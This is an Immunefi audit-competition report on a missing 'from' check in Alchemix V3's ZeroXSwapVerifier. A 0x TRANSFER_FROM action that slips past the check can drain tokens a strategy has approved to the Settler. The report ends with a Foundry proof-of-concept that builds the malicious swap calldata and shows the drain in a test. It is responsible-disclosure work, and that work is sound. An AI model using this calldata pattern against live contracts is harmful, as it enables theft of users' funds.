# 57516 sc low arbitrary external call in zeroxswapverifier leads to theft of unclaimed yield

**Submitted on Oct 26th 2025 at 21:33:36 UTC by @dray for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #57516
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/utils/ZeroXSwapVerifier.sol>
* **Impacts:**
  * Theft of unclaimed yield

## Description

## Brief/Intro

The ZeroXSwapVerifier.verifySwapCalldata() function fails to validate the from address in TRANSFER\_FROM actions within 0x protocol swaps. An attacker can exploit this by crafting a malicious 0x swap payload that includes a transferFrom(strategy, attacker, amount) action, draining all yield tokens approved to the 0x Settler. Since strategies (like the Transmuter) pre-approve the 0x Settler with unlimited allowance, the attacker can steal all tokens held by the strategy contract through a legitimate-looking swap operation.

## Vulnerability Details

Root Cause The ZeroXSwapVerifier.sol validates individual actions within 0x protocol swaps, but the \_verifyTransferFrom() function fails to check that tokens are being transferred from the user, not from the contract itself:

```solidity
function _verifyTransferFrom(bytes memory action, address owner, address targetToken, uint256 targetAmount) internal view {
    (address token, , , uint256 amount) = abi.decode(
        _sliceSkipSelector(action),
        (address, address, address, uint256)
    );
    
    require(token == targetToken, "Token mismatch");
    
    // ❌ MISSING: Validation that 'from' address is 'owner', not the contract!
    // The decoded parameters are: (token, from, to, amount)
    // But we never check that 'from == owner'
}

```

The full signature of the TRANSFER\_FROM action (selector 0x8d68a156) is:

```solidity
From(address token, address from, address to, uint256 amount)
```

The verifier decodes all four parameters but only validates the token parameter. It never checks that from == owner, allowing an attacker to set from to the strategy contract address.

The verifier has several checks, but none prevent this exploit:

Settler validation: Only checks that the target is the legitimate 0x Settler contract Action type validation: TRANSFER\_FROM (0x8d68a156) is a valid 0x action type Token validation: The verifier checks token == targetToken, which passes Amount validation: Not enforced for TRANSFER\_FROM actions From address validation: COMPLETELY MISSING

## Impact Details

Direct Financial Loss Total funds at risk: All tokens approved to the 0x Settler by any strategy contract.

Affected scenarios: Transmuter: All MYT (yield tokens) held in the Transmuter when used with ZeroXSwapVerifier Any strategy: Any ERC20 tokens that strategies approve to the 0x Settler for swap operations Multi-token exposure: If strategies approve multiple tokens, all are at risk

## References

Vulnerable contract: ZeroXSwapVerifier.sol (lines 238-249, \_verifyTransferFrom function)

## Proof of Concept

## Proof of Concept

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ZeroXSwapVerifier} from "../utils/ZeroXSwapVerifier.sol";
import {TestERC20} from "./mocks/TestERC20.sol";

/// @notice Minimal stand-in for the real 0x Settler contract used during swaps.
/// @dev The real settler executes a list of encoded "actions". I only implement
///      the behaviour needed for this exploit: forwarding TRANSFER_FROM calls.
contract FakeZeroXSettler {
    bytes4 private constant TRANSFER_FROM = 0x8d68a156;

    // Fallback to handle the 0x protocol's execute function
    // The verifier uses EXECUTE_SELECTOR = 0xcf71ff4f but the actual signature varies
    fallback() external {
        // In production the first 4 bytes contain the selector. Skip it and decode
        // the rest as execute(SlippageAndActions, bytes[]) just like 0x does.
        bytes calldata data = msg.data[4:];
        (ZeroXSwapVerifier.SlippageAndActions memory saa, ) = abi.decode(data, (ZeroXSwapVerifier.SlippageAndActions, bytes[]));
        _processActions(saa.actions);
    }

    function _processActions(bytes[] memory actions) internal {
        for (uint256 i = 0; i < actions.length; i++) {
            bytes4 selector = bytes4(actions[i]);
            if (selector == TRANSFER_FROM) {
                // Each action is ABI-encoded. Strip the selector and decode the payload
                // as (token, from, to, amount) exactly like the real 0x TRANSFER_FROM.
                (address token, address from, address to, uint256 amount) = abi.decode(
                    _sliceSkipSelector(actions[i]),
                    (address, address, address, uint256)
                );
                IERC20(token).transferFrom(from, to, amount);
            } else {
                revert("unsupported action");
            }
        }
    }

    function _sliceSkipSelector(bytes memory data) internal pure returns (bytes memory) {
        bytes memory result = new bytes(data.length - 4);
        for (uint256 i = 4; i < data.length; i++) {
            result[i - 4] = data[i];
        }
        return result;
    }
}

/// @notice Simple strategy that mirrors how production strategies integrate with the verifier.
/// @dev The important detail is the unlimited approval to the settler, which the attacker abuses.
contract StrategyUsingVerifier {
    IERC20 public immutable token;
    address public immutable settler;

    constructor(IERC20 _token, address _settler) {
        token = _token;
        settler = _settler;
        _token.approve(_settler, type(uint256).max);
    }

    function deposit(uint256 amount) external {
        require(token.transferFrom(msg.sender, address(this), amount), "deposit failed");
    }

    function executeSwap(bytes calldata data, uint256 maxSlippageBps) external {
        // Step 1: ask the verifier whether the calldata looks safe.
        bool ok = ZeroXSwapVerifier.verifySwapCalldata(data, address(this), address(token), maxSlippageBps);
        require(ok, "verification failed");

        // Step 2: forward the calldata to the (mocked) 0x settler. If the verifier
        // missed a malicious action, the settler will happily execute it.
        (bool success,) = settler.call(data);
        require(success, "settler call failed");
    }
}

contract ZeroXSwapVerifierExploitTest is Test {
    bytes4 private constant EXECUTE_SELECTOR = 0xcf71ff4f; // 0x protocol's execute selector
    bytes4 private constant TRANSFER_FROM = 0x8d68a156;

    TestERC20 internal token;
    FakeZeroXSettler internal settler;
    StrategyUsingVerifier internal strategy;
    address internal attacker = address(0xBEEF);

    function setUp() public {
        token = new TestERC20(1_000e18, 18);
        settler = new FakeZeroXSettler();
        strategy = new StrategyUsingVerifier(IERC20(address(token)), address(settler));

        // Fund strategy with 100 tokens
        token.transfer(address(strategy), 100e18);

        // Give attacker some ether for calls (not strictly needed but realistic)
        vm.deal(attacker, 1 ether);
    }

    function testExploitDrainViaTransferFromAction() public {
        uint256 strategyBalanceBefore = token.balanceOf(address(strategy));
        uint256 attackerBalanceBefore = token.balanceOf(attacker);

        // Build calldata that masquerades as a valid 0x swap but contains a single
        // TRANSFER_FROM action that steals every token from the strategy.
        bytes memory maliciousCalldata = _buildMaliciousTransferFromCalldata(
            address(token),
            address(strategy),
            attacker,
            strategyBalanceBefore
        );

        // Keeper / governance triggers what they think is a safe swap. The verifier
        // returns true, so the strategy forwards the payload to the settler.
        strategy.executeSwap(maliciousCalldata, 1_000); // 10% max slippage

        uint256 strategyBalanceAfter = token.balanceOf(address(strategy));
        uint256 attackerBalanceAfter = token.balanceOf(attacker);

        assertEq(strategyBalanceAfter, 0, "Strategy should be drained");
        assertEq(attackerBalanceAfter - attackerBalanceBefore, strategyBalanceBefore, "attacker gains entire balance");
    }

    function _buildMaliciousTransferFromCalldata(
        address tokenAddress,
        address from,
        address to,
        uint256 amount
    ) internal pure returns (bytes memory) {
        // 1. Encode a TRANSFER_FROM action that drains `from` -> `to`.
        bytes memory action = abi.encodeWithSelector(
            TRANSFER_FROM,
            tokenAddress,
            from,
            to,
            amount
        );

        // 2. Wrap the action in the SlippageAndActions struct required by the
        //    verifier/settler pipeline. No real swap occurs: the array contains
        //    just our malicious transfer.
        ZeroXSwapVerifier.SlippageAndActions memory saa = ZeroXSwapVerifier.SlippageAndActions({
            recipient: to,
            buyToken: address(0),
            minAmountOut: 0,
            actions: new bytes[](1)
        });
        saa.actions[0] = action;

        // 3. Finally encode the full calldata for 0x's execute(...) entry point.
        return abi.encodeWithSelector(EXECUTE_SELECTOR, saa, new bytes[](0));
    }
}
```
